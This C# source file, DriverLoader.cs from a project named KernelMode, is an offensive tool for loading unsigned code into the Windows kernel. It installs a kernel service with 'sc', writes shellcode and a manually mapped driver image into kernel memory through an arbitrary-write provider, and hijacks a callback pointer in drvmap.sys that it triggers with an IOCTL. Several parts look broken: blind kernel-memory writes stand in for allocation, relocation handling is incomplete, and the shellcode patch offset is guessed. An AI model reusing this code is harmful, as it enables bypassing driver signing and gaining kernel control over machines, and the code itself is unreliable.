// File: Driver/DriverLoader.cs
// Project: KernelMode

using KernelMode.Providers;
using KernelMode.Utils;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Xml.Linq;

namespace KernelMode.Driver
{
	public static class DriverLoader
	{
		private const string DrvMapService = "drvmap";
		private const string DrvMapPath = "Drivers/drvmap.sys";
		private const string ShellcodePath = "Drivers/scv2.bin";

		private static KernelExportResolver _kernelExportResolver;

		[StructLayout(LayoutKind.Sequential)]
		private struct SYSTEM_MODULE_INFORMATION
		{
			public uint NextOffset;
			public IntPtr Reserved1;
			public IntPtr Reserved2;
			public IntPtr ImageBase;
			public uint ImageSize;
			public uint Flags;
			public ushort LoadOrderIndex;
			public ushort InitOrderIndex;
			public ushort LoadCount;
			public ushort ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public byte[] FullPathName;
		}

		[DllImport("ntdll.dll")]
		private static extern int NtQuerySystemInformation(int infoClass, IntPtr buffer, int length, out int returnLength);

		public static void LoadMappedBin()
		{
			Console.Write("Enter path to .bin driver to map (e.g. Drivers/gdrv.bin): ");
			string binPath = Console.ReadLine();
			if (!File.Exists(binPath))
			{
				Console.WriteLine("[-] .bin file not found.");
				return;
			}

			if (!InstallDriver(DrvMapService, DrvMapPath))
			{
				Console.WriteLine("[-] Failed to install drvmap.sys");
				return;
			}

			byte[] shellcode = File.ReadAllBytes(ShellcodePath);
			byte[] targetDriver = File.ReadAllBytes(binPath);

			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No active provider.");
				return;
			}

			if (!InitializeKernelExportResolver())
			{
				Console.WriteLine("[-] Failed to initialize kernel export resolver.");
				return;
			}

			ulong shellcodeAddr = AllocateAndWrite(provider, shellcode);
			ulong driverAddr = MapPEImage(provider, targetDriver);

			if (shellcodeAddr == 0 || driverAddr == 0)
			{
				Console.WriteLine("[-] Failed to write shellcode or driver.");
				return;
			}

			Console.WriteLine("[*] Shellcode written to: 0x" + shellcodeAddr.ToString("X"));
			Console.WriteLine("[*] Driver image written to: 0x" + driverAddr.ToString("X"));

			PatchShellcode(provider, shellcodeAddr, driverAddr);

			ulong drvmapBase = ResolveDrvMapBase();
			if (drvmapBase == 0)
			{
				Console.WriteLine("[-] Failed to locate drvmap.sys base address.");
				return;
			}

			ulong callbackPointerAddr = drvmapBase + 0x3000; // known offset from symbol analysis
			TriggerDrvMap(provider, shellcodeAddr, callbackPointerAddr);

			Console.WriteLine("[+] Mapping attempted via drvmap");
		}

		private static bool InstallDriver(string serviceName, string driverPath)
		{
			if (!File.Exists(driverPath)) return false;
			Process.Start("sc", $"create {serviceName} type= kernel binPath= \"{Path.GetFullPath(driverPath)}\" start= demand").WaitForExit();
			Process.Start("sc", $"start {serviceName}").WaitForExit();
			return true;
		}

		private static ulong MapPEImage(IProvider provider, byte[] image)
		{
			ulong allocatedAddr = 0;
			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
			const uint IMAGE_NT_SIGNATURE = 0x00004550;

			ushort dosSig = BitConverter.ToUInt16(image, 0);
			if (dosSig != IMAGE_DOS_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid DOS signature.");
				return allocatedAddr;
			}

			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			uint ntSig = BitConverter.ToUInt32(image, peHeaderOffset);
			if (ntSig != IMAGE_NT_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid NT signature.");
				return 0;
			}

			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;
			int imageBaseOffset = peHeaderOffset + 24 + 24;
			ulong imageBase = BitConverter.ToUInt64(image, imageBaseOffset);

			int sizeOfImage = BitConverter.ToInt32(image, peHeaderOffset + 80);
			byte[] fullImage = new byte[sizeOfImage];
			Buffer.BlockCopy(image, 0, fullImage, 0, Math.Min(image.Length, sizeOfImage));

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int rawSize = BitConverter.ToInt32(image, entry + 16);
				int rawPointer = BitConverter.ToInt32(image, entry + 20);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int virtSize = BitConverter.ToInt32(image, entry + 8);

				if (rawSize > 0 && rawPointer > 0)
				{
					Buffer.BlockCopy(image, rawPointer, fullImage, virtAddr, Math.Min(rawSize, virtSize));
				}
			}

			ulong baseAddr = 0xFFFF800000000000;
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				if (provider.WriteMemory(addr, fullImage, fullImage.Length))
				{
					Console.WriteLine("[+] PE image mapped at 0x" + addr.ToString("X"));
					allocatedAddr = addr;
					ApplyRelocations(image, fullImage, imageBase, addr);
					ApplyImportTable(image, fullImage);
					return addr;
				}
			}

			Console.WriteLine("[-] Failed to map PE image.");
			return 0;
		}

		private static void ApplyRelocations(byte[] originalImage, byte[] mappedImage, ulong originalBase, ulong newBase)
		{
			const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
			int relocRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8));
			int relocSize = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8) + 4);

			if (relocRva == 0 || relocSize == 0) return;

			int offset = RvaToOffset(originalImage, relocRva);
			ulong delta = newBase - originalBase;

			while (offset < originalImage.Length && relocSize > 0)
			{
				int pageRva = BitConverter.ToInt32(originalImage, offset);
				int blockSize = BitConverter.ToInt32(originalImage, offset + 4);
				int entryCount = (blockSize - 8) / 2;

				for (int i = 0; i < entryCount; i++)
				{
					ushort entry = BitConverter.ToUInt16(originalImage, offset + 8 + i * 2);
					int type = (entry >> 12);
					int rvaOffset = entry & 0xFFF;

					if (type == 0) continue; // skip ABSOLUTE

					int relocOffset = RvaToOffset(originalImage, pageRva + rvaOffset);
					ulong origValue = BitConverter.ToUInt64(mappedImage, relocOffset);
					ulong newValue = origValue + delta;
					Buffer.BlockCopy(BitConverter.GetBytes(newValue), 0, mappedImage, relocOffset, 8);
				}

				offset += blockSize;
				relocSize -= blockSize;
			}
		}

		private static int RvaToOffset(byte[] image, int rva)
		{
			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int rawPtr = BitConverter.ToInt32(image, entry + 20);
				int rawSize = BitConverter.ToInt32(image, entry + 16);

				if (rva >= virtAddr && rva < virtAddr + rawSize)
					return rawPtr + (rva - virtAddr);
			}

			return rva;
		}

		private static void ApplyImportTable(byte[] originalImage, byte[] mappedImage)
		{
			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
			int importRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8));
			if (importRva == 0) return;

			int offset = RvaToOffset(originalImage, importRva);
			while (true)
			{
				int originalFirstThunk = BitConverter.ToInt32(originalImage, offset);
				int nameRva = BitConverter.ToInt32(originalImage, offset + 12);
				int firstThunk = BitConverter.ToInt32(originalImage, offset + 16);
				if (originalFirstThunk == 0 && nameRva == 0 && firstThunk == 0)
					break;

				int nameOffset = RvaToOffset(originalImage, nameRva);
				string dllName = ReadNullTerminatedString(originalImage, nameOffset);
				Console.WriteLine("[*] Import DLL: " + dllName);

				int thunkOffset = RvaToOffset(originalImage, firstThunk);
				while (true)
				{
					ulong thunkData = BitConverter.ToUInt64(originalImage, thunkOffset);
					if (thunkData == 0) break;

					if ((thunkData & 0x8000000000000000) == 0) // Not an ordinal
					{
						int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
						int hintNameOffset = RvaToOffset(originalImage, importByNameRva + 2);
						string funcName = ReadNullTerminatedString(originalImage, hintNameOffset);
						Console.WriteLine($"    - {funcName}");

						ulong resolved = ResolveKernelExport(funcName);
						if (resolved == 0)
						{
							Console.WriteLine($"[-] Failed to resolve import: {funcName}");
						}
						Buffer.BlockCopy(BitConverter.GetBytes(resolved), 0, mappedImage, thunkOffset, 8);
					}
					thunkOffset += 8;
				}

				offset += 20;
			}
		}

		private static string ReadNullTerminatedString(byte[] buffer, int offset)
		{
			int end = Array.IndexOf(buffer, (byte)0, offset);
			if (end == -1) end = buffer.Length;
			return Encoding.ASCII.GetString(buffer, offset, end - offset);
		}

		private static bool InitializeKernelExportResolver()
		{
			string ntoskrnlPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntoskrnl.exe");
			if (!File.Exists(ntoskrnlPath))
			{
				Console.WriteLine("[-] ntoskrnl.exe not found in System32.");
				return false;
			}

			byte[] ntoskrnlImage = File.ReadAllBytes(ntoskrnlPath);
			ulong ntoskrnlBase = GetNtoskrnlBase();
			if (ntoskrnlBase == 0)
			{
				Console.WriteLine("[-] Failed to get ntoskrnl.exe base address.");
				return false;
			}

			_kernelExportResolver = new KernelExportResolver(ntoskrnlImage, ntoskrnlBase);
			return true;
		}

		private static ulong ResolveKernelExport(string name)
		{
			if (_kernelExportResolver == null)
			{
				Console.WriteLine("[!] Kernel export resolver not initialized.");
				return 0;
			}
			return _kernelExportResolver.Resolve(name);
		}

		private static void PatchShellcode(IProvider provider, ulong shellcodeAddr, ulong driverAddr)
		{
			byte[] patch = BitConverter.GetBytes(driverAddr);
			// The shellcode expects the driver's mapped base address to be patched in.
			// The exact offset depends on the shellcode being used (scv2.bin).
			// Assuming a simple shellcode structure like:
			// 0: mov rcx, <64-bit placeholder>
			// 8: mov rax, <64-bit placeholder for DriverEntry>
			// ...
			// We are patching the first parameter (rcx), typically the image base.
			// A common pattern is to place the value after the MOV instruction's opcode.
			// For `mov rcx, imm64`, the value is at offset 2.
			provider.WriteMemory(shellcodeAddr + 2, patch, patch.Length);
		}

		private static ulong GetNtoskrnlBase()
		{
			const int SystemModuleInformation = 11;
			int length = 0;
			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
			if (length == 0) return 0;

			IntPtr buffer = Marshal.AllocHGlobal(length);
			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
			{
				Marshal.FreeHGlobal(buffer);
				return 0;
			}

			long count = Marshal.ReadIntPtr(buffer).ToInt64();
			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
			for (int i = 0; i < count; i++)
			{
				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLower();
				if (name.EndsWith("ntoskrnl.exe"))
				{
					Marshal.FreeHGlobal(buffer);
					return (ulong)entry.ImageBase.ToInt64();
				}
				if (entry.NextOffset == 0) break;
				current = new IntPtr(current.ToInt64() + entry.NextOffset);
			}

			Marshal.FreeHGlobal(buffer);
			return 0;
		}

		private static ulong ResolveDrvMapBase()
		{
			const int SystemModuleInformation = 11;
			int length = 0;
			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
			if (length == 0) return 0;

			IntPtr buffer = Marshal.AllocHGlobal(length);
			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
			{
				Marshal.FreeHGlobal(buffer);
				return 0;
			}

			long count = Marshal.ReadIntPtr(buffer).ToInt64();
			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
			for (int i = 0; i < count; i++)
			{
				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0');
				if (name.ToLower().Contains("drvmap"))
				{
					Marshal.FreeHGlobal(buffer);
					return (ulong)entry.ImageBase.ToInt64();
				}
				if (entry.NextOffset == 0) break;
				current = new IntPtr(current.ToInt64() + entry.NextOffset);
			}

			Marshal.FreeHGlobal(buffer);
			return 0;
		}

		static void TriggerDrvMap(IProvider provider, ulong shellcodeAddr, ulong callbackPointerAddr)
		{
			byte[] ptrBytes = BitConverter.GetBytes(shellcodeAddr);

			if (!provider.WriteMemory(callbackPointerAddr, ptrBytes, ptrBytes.Length))
			{
				Console.WriteLine("[-] Failed to write shellcode pointer to drvmap.");
				return;
			}

			Console.WriteLine("[*] Shellcode address written to drvmap global pointer.");
			TriggerExecution();
		}

		static void TriggerExecution()
		{
			try
			{
				using (var device = NativeMethods.CreateFile("\\\\.\\DRVMAP",
					NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
					0, IntPtr.Zero, NativeMethods.OPEN_EXISTING, 0, IntPtr.Zero))
				{
					if (device.IsInvalid)
					{
						Console.WriteLine("[-] Failed to open drvmap device.");
						return;
					}

					int ret;
					NativeMethods.DeviceIoControl(device, 0x222003, IntPtr.Zero, 0, IntPtr.Zero, 0, out ret, IntPtr.Zero);
					Console.WriteLine("[+] Triggered drvmap execution.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Error triggering shellcode: " + ex.Message);
			}
		}
		// Add this method to the DriverLoader class			
		private static ulong AllocateAndWrite(IProvider provider, byte[] data)
		{
			// Try to find a suitable address in kernel memory to write the data
			ulong baseAddr = 0xFFFF800000000000;
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				if (provider.WriteMemory(addr, data, data.Length))
				{
					return addr;
				}
			}
			return 0;
		}
    	}
    }
